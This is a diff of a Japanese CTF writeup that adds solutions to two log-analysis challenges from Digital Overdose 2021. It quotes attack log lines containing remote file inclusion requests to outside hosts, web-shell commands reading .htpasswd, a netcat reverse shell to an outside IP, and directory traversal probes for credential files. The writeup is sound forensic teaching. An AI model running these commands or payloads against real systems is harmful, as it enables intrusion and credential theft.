@@ -1,11 +1,11 @@
 ---
-title: "RACTF 2021 Writeup"
+title: "Digital Overdose 2021 Autumn CTF Writeup"
 date: 2021-10-11T20:00:00+09:00
-lastmod: 2021-10-11T20:00:00+09:00
+lastmod: 2021-10-13T23:00:00+09:00
 draft: false
 keywords: []
 description: ""
-tags: ["CTF"]
+tags: ["CTF", "Reviewed"]
 categories: ["CTF"]
 author: ""
 ---
@@ -14,16 +14,13 @@ author: ""
 <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
 
 {{% right %}}
-<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fractf_2021%2F">
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fdigitaloverdose_ractf_2021%2F">
 <img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
 </a>
 {{% /right %}}
 
 URL: [https://digitaloverdose.ractf.co.uk/](https://digitaloverdose.ractf.co.uk/)
 <br /><br />
-たぶん、RACTFって同じ名前のCTF (https://2021.ractf.co.uk/) が他にもありますね。
-
-<br />
 
 2900点を獲得し、チームとしては68位、個人では38位でした。
 
@@ -173,6 +170,182 @@ DO{RSA_1s_n0t_that_hard}
 <br />
 
 Flag: `DO{RSA_1s_n0t_that_hard}`
+
+
+
+<br /><br />
+<br /><br />
+## [Log Analysis]: Part 1 - Ingress (100 points)
+- - -
+### Challenge
+> Our website was hacked recently and the attackers completely ransomwared our server!
+<br /><br />
+We've recovered it now, but we don't want it to happen again. 
+<br /><br />
+Here are the logs from before the attack, can you find out what happened?
+
+Attachment:
+
+- attack.log
+
+<br />
+### Solution
+ログはスペース文字（white space）で区切られていて、フィールドは以下のようになっています。
+
+<pre>
+$ head -n1 attack.log
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+</pre>
+
+<br>
+
+6番目のcs-uri-queryを見ていくと、Base64でエンコードされた文字列が出てきます。
+
+<pre>
+$ cat attack.log | cut -d" " -f6 | sort -u
+-
+cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd
+cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==
+:
+(snip)
+:
+</pre>
+
+<br>
+
+これをデコードするとフラグが得られます。
+
+<pre>
+$ echo RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ== | base64 -d
+DO{better_remove_that_backdoor}
+</pre>
+
+<br>
+
+なお、このときのattackerのIPアドレスは 20.132.161.193 なので、それでフィルターすると、より詳しく攻撃内容がわかります。
+
+<pre>
+$ grep RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ attack.log | cut -d" " -f9
+20.132.161.193
+
+$ grep 20.132.161.193 attack.log | cut -d" " -f1,2,3,4,5,6
+2021-09-06 20:43:00 135.233.142.30 GET runtime-es2015.43df09c2199138dc23a5.js -
+2021-09-06 20:43:00 135.233.142.30 GET main-es2015.5dfab9e1774faff15645.js -
+2021-09-06 20:43:00 135.233.142.30 GET faq locale=http://bglzqntj.io:19/bglzqntj.txt%00
+2021-09-06 20:43:21 135.233.142.30 GET runtime-es2015.43df09c2199138dc23a5.js -
+2021-09-06 20:43:21 135.233.142.30 GET assets/images/community/cal-bg.svg -
+2021-09-06 20:43:21 135.233.142.30 GET assets/images/ctf/2021-01/offsec-logo.svg -
+2021-09-06 20:43:21 135.233.142.30 GET faq locale=http://ronworwu.io:0/ronworwu.txt%00
+2021-09-06 20:43:33 135.233.142.30 GET 6-es2015.2c367e3b65026d7698d3.js -
+2021-09-06 20:43:33 135.233.142.30 GET main-es5.5dfab9e1774faff15645.js -
+2021-09-06 20:43:33 135.233.142.30 GET runtime-es5.43df09c2199138dc23a5.js -
+2021-09-06 20:43:33 135.233.142.30 GET faq locale=http://rnugvbtp.io:26/rnugvbtp.txt%00
+2021-09-06 20:43:51 135.233.142.30 GET cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js -
+2021-09-06 20:43:51 135.233.142.30 GET faq locale=http://xyztftsz.io:7/xyztftsz.txt%00
+2021-09-06 20:43:59 135.233.142.30 GET assets/images/community/cal-bg.svg -
+2021-09-06 20:43:59 135.233.142.30 GET main-es5.5dfab9e1774faff15645.js -
+2021-09-06 20:43:59 135.233.142.30 GET 6-es2015.2c367e3b65026d7698d3.js -
+2021-09-06 20:43:59 135.233.142.30 GET faq locale=http://ejlaadxk.io:4/ejlaadxk.txt%00
+2021-09-06 20:44:19 135.233.142.30 GET ywesusnz cmd%3Dcd+..
+2021-09-06 20:44:45 135.233.142.30 GET ywesusnz cmd%3Dpwd
+2021-09-06 20:45:04 135.233.142.30 GET ywesusnz cmd%3Dwhoami
+2021-09-06 20:45:16 135.233.142.30 GET ywesusnz cmd%3Dhostname
+2021-09-06 20:45:46 135.233.142.30 GET ywesusnz cmd%3Dnetstat+-peanut
+2021-09-06 20:46:04 135.233.142.30 GET ywesusnz cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd
+2021-09-06 20:46:12 135.233.142.30 GET ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==
+2021-09-06 20:46:19 135.233.142.30 GET ywesusnz cmd%3Dnc+-e+%2Fbin%2Fsh+207.35.160.84+4213
+</pre>
+
+
+<br />
+
+Flag: `DO{better_remove_that_backdoor}`
+
+
+
+
+<br /><br />
+<br /><br />
+## [Log Analysis]: Part 2 - Investigation (150 points)
+- - -
+### Challenge
+> Thanks for finding the RFI vulnerability in our FAQ.  We have fixed it now, but we don't understand how the attacker found it so quickly.
+<br /><br />
+We suspect it might be an inside job, but maybe they got the source another way.  Here are the logs for the month prior to the attack, can you see anything suspicious?
+<br /><br />
+Please submit the attackers IP as the flag as follow, DO{x.x.x.x}
+
+Attachment:
+
+- more.log
+
+<br />
+### Solution
+これはイベント中に解けなかったやつなんですが、他の方のWriteupを見ると、DO{45.85.1.176} がフラグだったみたいですね。
+
+これはおかしいです。おそらくフラグが間違って設定されていたと思われます。
+
+45.85.1.176 はサーバのIPアドレスなので、attacker's IP ではありません。
+
+3番目に出てくる s-ip は、server IPで、9番目に出てくる c-ip が client IP です。実際、s-ipは、全てのログで 45.85.1.176 になっています（以下）。
+
+<pre>
+$ head -n1 attack.log
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+
+$ cat more.log | cut -d" " -f3 | sort -u
+45.85.1.176
+</pre>
+
+<br>
+Attackerのログは、実は結構明確で、directory traversalを使っていろいろファイルを取ろうと試みていて、ほとんどが404でエラーになってます。
+
+<pre>
+$ grep "\.\.//" more.log | head | cut -d" " -f4,5,6,7,8,9,11,12
+GET ../..//passwords.bckp - 443 - 200.13.84.124 - 404
+GET ..//configuration.3 - 443 - 200.13.84.124 - 404
+GET ../../..//db_config.1 - 443 - 200.13.84.124 - 404
+GET ../..//login.txt - 443 - 200.13.84.124 - 404
+GET ../..//auth.zip - 443 - 200.13.84.124 - 404
+GET ..//db.saved - 443 - 200.13.84.124 - 404
+GET ..//auth.saved - 443 - 200.13.84.124 - 404
+GET ../../..//db_config.old - 443 - 200.13.84.124 - 404
+GET ../../..//admin.older - 443 - 200.13.84.124 - 404
+GET ..//login.bckp - 443 - 200.13.84.124 - 404
+</pre>
+
+<br />
+まぁ、これだけで attacker's IP は 200.13.84.124 でほぼ確定なんですが、更に見ていくと、ほとんどのGETリクエストが404で失敗している中で、ひとつだけ200 OKで成功しているログがあります。
+
+以下で、backup.zipの取得に成功しています。チャレンジ文の、`maybe they got the source` にマッチするものと考えられます。
+
+<pre>
+$ grep 200.13.84.124 more.log | grep -v 404
+2021-08-03 08:55:00 45.85.1.176 GET backup.zip - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 200 0 0 25
+</pre>
+
+<br />
+
+ちなみに、このときのUser-Agentも怪しくて、RE97czNjcjN0X19fYWdlbnR9 はデコードすると別フラグが得られます。(Part 3 - Backup Policyのフラグだったようです。)
+
+<pre>
+$ echo RE97czNjcjN0X19fYWdlbnR9 | base64 -d
+DO{s3cr3t___agent}
+</pre>
+
+<br />
+
+ということで、フラグは
+
+Flag: <s>`DO{45.85.1.176}`</s>
+
+ではなく、
+
+Flag: `DO{200.13.84.124}`
+
+だと思います。
+
+
 
 
 
